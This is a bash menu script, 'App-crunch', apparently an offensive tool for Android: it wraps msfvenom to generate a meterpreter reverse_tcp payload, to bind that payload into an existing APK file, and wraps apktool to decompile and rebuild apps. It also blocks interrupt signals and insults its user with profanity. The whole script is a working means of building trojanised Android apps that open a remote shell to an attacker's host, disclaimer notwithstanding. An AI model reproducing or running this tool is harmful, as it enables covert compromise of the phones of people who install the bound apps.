#!/bin/bash
while :
do
        trap '' INT
        trap "" SIGTSTP
        trap "" SIGTERM
       	clear
        red='\033[1;31m'
        yellow='\033[1;33m'
        blue='\033[1;34m'
        printf "$red"
        echo "Server Name - $(hostname)"
        echo "Date: $(date)"
        printf "$blue"
        cat /opt/c.txt
        echo "           --------------App-crunch-v:1.0--------------"
        echo "             -------------By-Marcus0086--------------"
        printf "$red"
        echo "All in one tool for reverse-engineering as well as binding app with payload"
        printf "$yellow"
        echo "------Warning---once started no going back"
        printf "$red"
        echo "What do you want to do?"
	echo "1: Create a simple payload."
        echo "2: Bind payload with app."
	echo "3: Reverse Engineering."
	echo "4: Credits."
        echo "5: Exit."
	read -p "Enter your choice [ 1 -5 ] : " choice

	case $choice in
		1)      printf "$yellow"
                        echo "Payload Generator."
                        echo "Enter LHOST="
                        printf "$red"
                        echo "Your default running interfaces are :"
                        echo "$(touch h.txt)"
                        echo "$(hostname --all-ip-addresses >> h.txt)"
                        grep "10." h.txt
                        read l
                        printf "$yellow"
                        echo "Enter LPORT="
                        read p
                        rm -f h.txt
                        echo "Enter the name you want to give to payload"
                        read name
                        printf "$red"
                        echo "Creating payload wait 5-10 min........."
                        echo " $(msfvenom -p android/meterpreter/reverse_tcp LHOST=$l LPORT=$p R > /root/$name)"
                        printf "$red"
                        read -p "Press [Enter] key to continue..." readEnterKey
			;;
		2)      printf "$yellow"
                        echo "Be sure to put apk file in /root directory"
                        echo "The output file will be in /root directory"
                        echo "Enter LHOST="
                        printf "$red"
                        echo "Your default running interfaces are :"
                        echo "$(touch c.txt)"
                        echo "$(hostname --all-ip-addresses >> c.txt)"
                        grep "10." c.txt
                        read h
                        printf "$yellow"
                        echo "Enter LPORT="
                        read o
                        echo "Enter the name of apk file to which u want to bind payload"
                        read abc
                        echo "Enter the name for output file"
                        read xyz
                        rm -f c.txt
                        printf "$red"
                        echo "It will take more than 30 min be patient..........."
                        echo " $(msfvenom -p android/meterpreter/reverse_tcp -x $abc LHOST=$h LPORT=$o -f raw -o $xyz)"
                        printf "$red"
			read -p "Press [Enter] key to continue..." readEnterKey
			;;
                3)      printf "$yelpow"
                        echo "Reverse engineering"
                        echo "Enter path of app file or app folder eg:(/directory/appname.apk or /directory/appfolder"
                        read path
                        echo "Enter path where you want to store output"
                        read fart
                        echo "Enter e to decompile app"
                        echo "Enter r to recompile app folder"
                        read ch
                        if [ "$ch" == "e" ]
                        then
                        printf "$red"
                        echo "Decompiling ..........."
                        echo "$(apktool d $path -o $fart)"
                        elif [ "$ch" == "r" ]
                        then
                        printf "$red"
                        echo "Recompiling ..........."
                        echo "$(apktool b $path -o $fart)"
                        else
                        printf "$red"
                        echo "Bitch r u blind"
                        read -p "Press [Enter] key to continue..." readEnterKey
                        fi
                        printf "$red"
                        read -p "Press [Enter] key to continue..." readEnterKey
                        ;;

                4)      printf "$yellow"
                        echo "* This tool is made by Marcus aka Raghav Gupta."
                        echo "* This tool is open-source and is redistributable under GNU license 2018."
                        echo "* This tool is meant for education purposes only use it at your own risk."
                        echo "* We didn't take any responsibilty of the harm done by it."
                        printf "$red"
                        read -p "Press [Enter] key to continue..." readEnterKey
                        ;;
		5)      printf "$red"
			echo "Thank you for using App-crunch tool!!"
                        echo "...........EVERYTHING IS CONNECTED............"
			exit 0
			;;
		*)      printf "$red"
			echo "Error: Invalid option..."
                        printf "$yellow"
                        echo "Bitch u even don't know how to use this fucking software."
                        echo "Yeah yeah i got u now step out bitch."
                        printf "$red"
			read -p "Press [Enter] key to continue..." readEnterKey
			;;
	esac
done

